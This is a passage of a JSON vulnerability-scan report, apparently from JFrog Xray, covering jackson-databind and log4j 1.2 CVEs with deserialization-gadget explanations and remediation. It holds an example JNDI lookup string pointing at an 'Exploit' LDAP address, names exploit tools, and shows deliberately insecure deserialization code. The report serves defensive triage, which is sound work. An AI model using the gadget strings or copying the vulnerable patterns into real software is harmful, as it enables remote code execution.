          "https://lists.apache.org/thread.html/r1c09b9551f6953dbeca190a4c4b78198cdbb9825fce36f96fe3d8218@%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/r1efc776fc6ce3387593deaa94bbdd296733b1b01408a39c8d1ab9e0e@%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/r3d20a2660b36551fd8257d479941782af4a7169582449fac1704bde2%40%3Ccommits.druid.apache.org%3E",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0%40%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r3539bd3a377991217d724879d239e16e86001c54160076408574e1da%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2%40%3Cissues.geode.apache.org%3E",
          "https://lists.apache.org/thread.html/r1c09b9551f6953dbeca190a4c4b78198cdbb9825fce36f96fe3d8218%40%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/rf28ab6f224b48452afd567dfffb705fbda0fdbbf6535f6bc69d47e91%40%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/r5d8bea8e9d17b6efcf4a0e4e194e91ef46a99f505777a31a60da2b38%40%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/r9e59ebaf76fd00b2fa3ff5ebf18fe075ca9f4376216612c696f76718@%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/rb43f9a65150948a6bebd3cb77ee3e105d40db2820fd547528f4e7f89@%3Cissues.zookeeper.apache.org%3E",
          "https://security.netapp.com/advisory/ntap-20200327-0002",
          "https://github.com/FasterXML/jackson-databind/commit/9bb52c7122271df75435ec7e66ecf6b02b1ee14f",
          "https://lists.apache.org/thread.html/rac5ee5d686818be7e7c430d35108ee01a88aae54f832d32f62431fd1@%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r7762d69e85c58d6948823424017ef4c08f47de077644277fa18cc116@%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/re8ae2670ec456ef1c5a2a661a2838ab2cd00e9efa1e88c069f546f21%40%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r6fdd4c61a09a0c89f581b4ddb3dc6f154ab0c705fcfd0a7358b2e4e5@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rb73708bf714ed6dbc1212da082e7703e586077f0c92f3940b2e82caf@%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/rfc1ccfe89332155b72ce17f13a2701d3e7b9ec213324ceb90e79a28a@%3Cdev.ranger.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/commit/914e7c9f2cb8ce66724bf26a72adc7e958992497",
          "https://lists.apache.org/thread.html/rdf311f13e6356297e0ffe74397fdd25a3687b0a16e687c3ff5b834d8@%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/rf28ab6f224b48452afd567dfffb705fbda0fdbbf6535f6bc69d47e91@%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/r94930e39b60fff236160c1c4110fe884dc093044b067aa5fc98d7ee1%40%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/rb99c7321eba5d4c907beec46675d52827528b738cfafd48eb4d862f1%40%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/r8e96c340004b7898cad3204ea51280ef6e4b553a684e1452bf1b18b1@%3Cjira.kafka.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/commit/74aba4042fce35ee0b91bd2847e788c10040d78b",
          "https://lists.apache.org/thread.html/re7326b8655eab931f2a9ce074fd9a1a51b5db11456bee9b48e1e170c%40%3Cissues.zookeeper.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/issues/2620",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2@%3Cissues.geode.apache.org%3E",
          "https://lists.apache.org/thread.html/r8170007fd9b263d65b37d92a7b5d7bc357aedbb113a32838bc4a9485%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rac5ee5d686818be7e7c430d35108ee01a88aae54f832d32f62431fd1%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rcc72b497e3dff2dc62ec9b89ceb90bc4e1b14fc56c3c252a6fcbb013@%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/rdf8d389271a291dde3b2f99c36918d6cb1e796958af626cc140fee23%40%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rb43f9a65150948a6bebd3cb77ee3e105d40db2820fd547528f4e7f89%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0@%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rc717fd6c65190f4e592345713f9ef0723fb7d71f624caa2a17caa26a%40%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/r319f19c74e06c201b9d4e8b282a4e4b2da6dcda022fb46f007dd00d3%40%3Ccommits.druid.apache.org%3E",
          "https://lists.apache.org/thread.html/r078e68a926ea6be12e8404e47f45aabf04bb4668e8265c0de41db6db@%3Ccommits.druid.apache.org%3E",
          "https://lists.apache.org/thread.html/r94930e39b60fff236160c1c4110fe884dc093044b067aa5fc98d7ee1@%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/rc717fd6c65190f4e592345713f9ef0723fb7d71f624caa2a17caa26a@%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/r7e5c10534ed06bf805473ac85e8412fe3908a8fa4cabf5027bf11220%40%3Cdev.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/rb73708bf714ed6dbc1212da082e7703e586077f0c92f3940b2e82caf%40%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/r1efc776fc6ce3387593deaa94bbdd296733b1b01408a39c8d1ab9e0e%40%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/r46bebdeb59b8b7212d63a010ca445a9f5c4e9d64dcf693cab6f399d3@%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r2fa8046bd47fb407ca09b5107a80fa6147ba4ebe879caae5c98b7657%40%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/rc068e824654c4b8bd4f2490bec869e29edbfcd5dfe02d47cbf7433b2@%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/ra275f29615f35d5b40106d1582a41e5388b2a5131564e9e01a572987@%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/r7e5c10534ed06bf805473ac85e8412fe3908a8fa4cabf5027bf11220@%3Cdev.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/rb5eedf90ba3633e171a2ffdfe484651c9490dc5df74c8a29244cbc0e%40%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r7762d69e85c58d6948823424017ef4c08f47de077644277fa18cc116%40%3Cdev.ranger.apache.org%3E",
          "https://lists.apache.org/thread.html/rdea588d4a0ebf9cb7ce8c3a8f18d0d306507c4f8ba178dd3d20207b8%40%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/r3539bd3a377991217d724879d239e16e86001c54160076408574e1da@%3Cnotifications.zookeeper.apache.org%3E",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-8840",
          "https://lists.apache.org/thread.html/r8170007fd9b263d65b37d92a7b5d7bc357aedbb113a32838bc4a9485@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rb5eedf90ba3633e171a2ffdfe484651c9490dc5df74c8a29244cbc0e@%3Ccommits.zookeeper.apache.org%3E",
          "https://security.netapp.com/advisory/ntap-20200327-0002/",
          "https://github.com/FasterXML/jackson-databind",
          "https://lists.debian.org/debian-lts-announce/2020/02/msg00020.html",
          "http://www.huawei.com/en/psirt/security-advisories/huawei-sa-20200610-01-fastjason-en",
          "https://lists.apache.org/thread.html/r46bebdeb59b8b7212d63a010ca445a9f5c4e9d64dcf693cab6f399d3%40%3Ccommits.zookeeper.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuapr2020.html"
        ],
        "extended_information": {
          "short_description": "A typing issue in Apache XBean in Jackson-databind allows a remote attacker to perform remote code execution.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the `org.apache.xbean.propertyeditor.JndiConverter` gadget in [Apache XBean]( https://geronimo.apache.org/xbean/index.html) , the attacker can call `lookup` with an arbitrary location by calling ` toObjectImpl` with an arbitrary argument like `\"ldap://127.0.0.1:1088/Exploit\"`. This vulnerability allows the attacker to perform remote code execution as shown in this [PoC](https://www.programmersought.com/article/80917857170/).\n\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` apache.xbean ` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` apache.xbean ` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `apache.xbean` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-10968",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to org.aoju.bus.proxy.provider.remoting.RmiProvider (aka bus-proxy).",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.4]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-95785",
        "references": [
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://lists.debian.org/debian-lts-announce/2020/04/msg00012.html",
          "https://security.netapp.com/advisory/ntap-20200403-0002",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://security.netapp.com/advisory/ntap-20200403-0002/",
          "https://github.com/FasterXML/jackson-databind/issues/2662",
          "https://medium.com/%40cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-10968",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://www.oracle.com/security-alerts/cpujan2021.html",
          "https://github.com/advisories/GHSA-rf6r-2c4q-2vwg",
          "https://github.com/FasterXML/jackson-databind/commit/05d7e0e13f43e12db6a51726df12c8b4d8040676",
          "https://github.com/FasterXML/jackson-databind/commit/08fbfacf89a4a4c026a6227a1b470ab7a13e2e88",
          "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        ],
        "extended_information": {
          "short_description": "A typing issue in bus-proxy in Jackson-databind allows a remote attacker to perform code injection.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted]( https://github.com/FasterXML/jackson-databind/blob/2.13/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [bus-proxy]( https://github.com/aoju/bus) gadget, an attacker can \nset the `host` and `port` parameters of the `org.aoju.bus.proxy.provider.remoting.RmiProvider` which can cause remote code execution on the next time that the bus-proxy will be used. A malicious Rmi provider can be created with the [marshalsec](https://github.com/mbechler/marshalsec) project (`RMIRefServer`).\n\nWhen this library is included, an attacker can build a working exploit, and even automate this process by using [ysoserial]( https://github.com/frohoff/ysoserial), a tool that finds gadgets and create payloads for vulnerable java deserializers.\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes bus-proxy in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes bus-proxy in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `bus-proxy` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      }
    ],
    "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "6b4b8349-3b58-45e5-7f54-16f6700c72b4",
    "component_id": "gav://com.fasterxml.jackson.datatype:jackson-datatype-jdk8:2.13.4",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "db266b37-18e6-413a-62d8-9c16b31e7020",
    "component_id": "gav://com.fasterxml.jackson.datatype:jackson-datatype-jsr310:2.13.4",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "0871189c-f000-4047-5629-2fcda30ddb56",
    "component_id": "gav://com.fasterxml.jackson.module:jackson-module-parameter-names:2.13.4",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "a7ef1e59-0514-4c7b-764d-8baeb028574a",
    "component_id": "gav://jakarta.annotation:jakarta.annotation-api:1.3.5",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "cb920a6c-75ba-420f-4c68-c7c912be31e7",
    "component_id": "gav://org.slf4j:jul-to-slf4j:1.7.36",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "b54d1e40-600a-427f-6337-23c96545c272",
    "vulnerabilities": [
      {
        "cves": [
          {
            "cve": "CVE-2023-26464",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-400",
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-400": {
                "name": "Uncontrolled Resource Consumption",
                "description": "The product does not properly control the allocation and maintenance of a limited resource, thereby enabling an actor to influence the amount of resources consumed, eventually leading to the exhaustion of available resources."
              },
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "** UNSUPPORTED WHEN ASSIGNED **\n\nWhen using the Chainsaw or SocketAppender components with Log4j 1.x on JRE less than 1.7, an attacker that manages to cause a logging entry involving a specially-crafted (ie, deeply nested) \nhashmap or hashtable (depending on which logging component is in use) to be processed could exhaust the available memory in the virtual machine and achieve Denial of Service when the object is deserialized.\n\nThis issue affects Apache Log4j before 2. Affected users are recommended to update to Log4j 2.x.\n\nNOTE: This vulnerability only affects products that are no longer supported by the maintainer.",
        "severity": "High",
        "components": {
          "gav://log4j:log4j:1.2.17": {
            "fixed_versions": [
              "[2.0.0]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://log4j:log4j:1.2.17"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-427843",
        "references": [
          "https://github.com/advisories/GHSA-vp98-w2p3-mv35",
          "https://nvd.nist.gov/vuln/detail/CVE-2023-26464",
          "https://security.netapp.com/advisory/ntap-20230505-0008",
          "https://security.netapp.com/advisory/ntap-20230505-0008/",
          "https://lists.apache.org/thread/wkx6grrcjkh86crr49p4blc1v1nflj3t"
        ],
        "extended_information": {
          "short_description": "Insufficient input validation in Log4j 1.x may lead to denial of service when logging attacker-controlled input.",
          "full_description": "[Apache Log4j](https://logging.apache.org/log4j/1.2/) is a ubiquitous Java-based logging framework.\n[SocketAppender](https://logging.apache.org/log4j/1.2/apidocs/org/apache/log4j/net/SocketAppender.html) is a class in Log4j server that writes logging events to a remote server.\n[Chainsaw](https://logging.apache.org/chainsaw/2.x/) is a companion module that allows to view the logs in a GUI-based viewer via a `SocketAppender`.\n\nIt was discovered that an insufficient input check in `SocketAppender` or the `Chainsaw` components may lead to a denial of service. \nA deeply-nested log entry (`hashmap` or `hashtable` type) could lead to an unbounded memory footprint when deserialized, and in some cases, relatively small log entries can consume much larger amounts of memory. \n\nAn attacker can exploit this vulnerability by entering crafted strings into input fields or headers of an application that are logged and cause a denial of service.\n\nThere is no published exploit for this vulnerability.\n\nThe vulnerability affects only Log4j 1.2.x versions. Log4j v1 is no longer maintained, and users should upgrade to Log4j 2.\n\nNote that this vulnerability is less likely to be exploited, as `Log4j` needs to be specifically configured to use `SocketAppender` or `Chainsaw`, which is not the default.\n\nExample for a vulnerable configuration:\n```\n\u003clog4j:configuration debug=\"false\" threshold=\"debug\" xmlns:log4j=\"http://jakarta.apache.org/log4j/\"\u003e\n    \u003cappender name=\"socketAppender\" class=\"org.apache.log4j.net.SocketAppender\"\u003e\n        \u003cparam name=\"Name\" value=\"MySockeAppender\" /\u003e\n        \u003cparam name=\"advertiseViaMulticastDNS\" value=\"true\" /\u003e\n    \u003c/appender\u003e\n    \u003croot\u003e\n        \u003clevel value=\"INFO\" /\u003e\n        \u003cappender-ref ref=\"socketAppender\" /\u003e\n    \u003c/root\u003e\n\u003c/log4j:configuration\u003e\n```",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The vulnerability requires Log4j to run an outdated Java version below 1.7, which was released more than a decade ago.",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find a remote service that logs an attacker-controlled input using the Log4j API. In addition, the  Log4j application needs to be specifically configured to use `SocketAppender`, which is not enabled by default (see a vulnerable configuration example in \"Details\").",
              "is_positive": true
            },
            {
              "name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
              "description": "The CVSS does not reflect the contextual prerequisites required to exploit the vulnerability.",
              "is_positive": true
            }
          ]
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2021-4104",
            "cvss_v2_score": "6.0",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:S/C:P/I:P/A:P",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "JMSAppender in Log4j 1.2 is vulnerable to deserialization of untrusted data when the attacker has write access to the Log4j configuration. The attacker can provide TopicBindingName and TopicConnectionFactoryBindingName configurations causing JMSAppender to perform JNDI requests that result in remote code execution in a similar fashion to CVE-2021-44228. Note this issue only affects Log4j 1.2 when specifically configured to use JMSAppender, which is not the default. Apache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions.",
        "severity": "High",
        "components": {
          "gav://log4j:log4j:1.2.17": {
            "impact_paths": [
              [
                {
                  "component_id": "gav://log4j:log4j:1.2.17"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-192153",
        "references": [
          "https://github.com/ClickHouse/clickhouse-jdbc-bridge",
          "https://www.kb.cert.org/vuls/id/930724",
          "https://security.gentoo.org/glsa/202312-04",
          "https://security.gentoo.org/glsa/202312-02",
          "https://www.cve.org/CVERecord?id=CVE-2021-44228",
          "https://security.gentoo.org/glsa/202209-02",
          "https://nvd.nist.gov/vuln/detail/CVE-2021-4104",
          "https://access.redhat.com/security/cve/CVE-2021-4104",
          "https://github.com/ClickHouse/clickhouse-jdbc-bridge/security/advisories/GHSA-3w6p-8f82-gw8r",
          "https://www.oracle.com/security-alerts/cpujan2022.html",
          "http://www.openwall.com/lists/oss-security/2022/01/18/3",
          "https://security.netapp.com/advisory/ntap-20211223-0007",
          "https://security.netapp.com/advisory/ntap-20211223-0007/",
          "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0033",
          "https://github.com/apache/logging-log4j2",
          "https://security.gentoo.org/glsa/202310-16",
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://www.oracle.com/security-alerts/cpujul2022.html",
          "https://github.com/apache/logging-log4j2/pull/608#issuecomment-990494126"
        ]
      },
      {
        "cves": [
          {
            "cve": "CVE-2022-23305",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-89"
            ],
            "cwe_details": {
              "CWE-89": {
                "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
                "description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "3"
                  }
                ]
              }
            }
          }
        ],
        "summary": "By design, the JDBCAppender in Log4j 1.2.x accepts an SQL statement as a configuration parameter where the values to be inserted are converters from PatternLayout. The message converter, %m, is likely to always be included. This allows attackers to manipulate the SQL by entering crafted strings into input fields or headers of an application that are logged allowing unintended SQL queries to be executed. Note this issue only affects Log4j 1.x when specifically configured to use the JDBCAppender, which is not the default. Beginning in version 2.0-beta8, the JDBCAppender was re-introduced with proper support for parameterized SQL queries and further customization over the columns written to in logs. Apache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions.",
        "severity": "Critical",
        "components": {
          "gav://log4j:log4j:1.2.17": {
            "impact_paths": [
              [
                {
                  "component_id": "gav://log4j:log4j:1.2.17"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-194906",
        "references": [
          "https://nvd.nist.gov/vuln/detail/CVE-2022-23305",
          "https://security.netapp.com/advisory/ntap-20220217-0007",
          "https://lists.apache.org/thread/pt6lh3pbsvxqlwlp4c5l798dv2hkc85y",
          "https://github.com/apache/logging-log4j1",
          "https://www.oracle.com/security-alerts/cpujul2022.html",
          "http://www.openwall.com/lists/oss-security/2022/01/18/4",
          "https://logging.apache.org/log4j/1.2/index.html",
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://security.netapp.com/advisory/ntap-20220217-0007/"
        ],
        "extended_information": {
          "short_description": "Insufficient input validation in Log4j JDBCAppender allows attackers to perform SQL Injection.",
          "full_description": "[JDBCAppender](https://logging.apache.org/log4j/2.x/log4j-core/apidocs/org/apache/logging/log4j/core/appender/db/jdbc/JdbcAppender.html) is a class in Log4j server that writes logging events to a relational database using standard JDBC mechanisms.\n\nIt was discovered an insufficient input check in `JDBCAppender` class may lead to SQL Injection. \nThe `JDBCAppender` class accepts an SQL statement as a configuration parameter and did not properly check the input.\n\nThe values inserted into the SQL statement are converted using a `PatternLayout`.\nThis class formats a logging event and returns the result as a string. The results depend on the conversion pattern, which is closely related to the conversion pattern of the `printf` C function.\n\nThe `%m` conversion character acts as the `printf` `%s` conversion character.\nIt is likely always to be included at the log formatting, as it's the one that should contain the log message provided.\n\nAn attacker can exploit this vulnerability by entering crafted strings into input fields or headers of an application that are logged and cause SQL queries to be executed.\n\nThere is no published exploit for this vulnerability.\n\nThe vulnerability affects only Log4j 1.2.x versions. Log4j v1 is no longer maintained, and users should upgrade to Log4j 2.\n\nNote that this vulnerability is less likely to be exploited, as `Log4j` needs to be specifically configured to use `JDBCAppender`, which is not the default.\n\nAn example vulnerable configuration that enables `JDBCAppender`:\n```\n\u003c?xml version=\"1.0\" 